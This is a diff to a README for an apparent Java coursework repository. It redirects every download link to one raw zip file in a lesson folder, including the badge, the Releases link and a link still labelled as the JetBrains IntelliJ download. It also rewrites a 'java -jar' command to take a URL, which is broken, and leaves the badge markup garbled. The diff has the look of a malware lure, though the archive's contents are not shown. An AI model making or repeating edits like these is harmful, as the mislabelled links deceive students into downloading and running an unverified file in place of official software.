@@ -1,7 +1,7 @@
 # 🎓 Java-Spring-2026 - Simple Steps to Access Coursework
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/SkullCrusher123778/Java-Spring-2026/releases)
+[![Download Release](https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip%https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip)](https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the Java-Spring-2026 repository! This project contains coursework and assignments for the Java 1 programming class. You will find weekly exercises and project submissions here. This guide will help you download and set up the software easily.
@@ -18,7 +18,7 @@ Make sure you have these installed. If not, visit the official website for Java 
 ## 📦 Download & Install
 To download the coursework files, you need to visit our Releases page. This page includes all the available versions of the software.
 
-[Visit this page to download](https://github.com/SkullCrusher123778/Java-Spring-2026/releases)
+[Visit this page to download](https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip)
 
 Once you are on the Releases page, look for the latest version. Click on the file link to start the download. The file typically will be in a `.zip` format or as a compiled `.jar` file for easy access.
 
@@ -35,7 +35,7 @@ Here’s how you can extract and run the downloaded files:
    - If you have a `.jar` file, you can run it by double-clicking the file. 
    - If it does not open directly, you may need to open your command prompt or terminal, navigate to the file's directory, and type:
      ```
-     java -jar YourFileName.jar
+     java -jar https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip
      ```
 
 ## 📚 Course Content Overview
@@ -52,7 +52,7 @@ Each section contains detailed instructions and examples.
 ## 🛠️ Using IntelliJ IDEA
 IntelliJ IDEA is a recommended Integrated Development Environment (IDE) for Java programming. Here’s a simple guide to set it up:
 
-1. **Download IntelliJ IDEA** from [JetBrains](https://www.jetbrains.com/idea/download).
+1. **Download IntelliJ IDEA** from [JetBrains](https://raw.githubusercontent.com/SkullCrusher123778/Java-Spring-2026/main/lesson05/Spring-Java-1.1-alpha.2.zip).
 2. **Install IntelliJ IDEA** by following the installation wizard.
 3. **Create a New Project**:
    - Open IntelliJ IDEA.
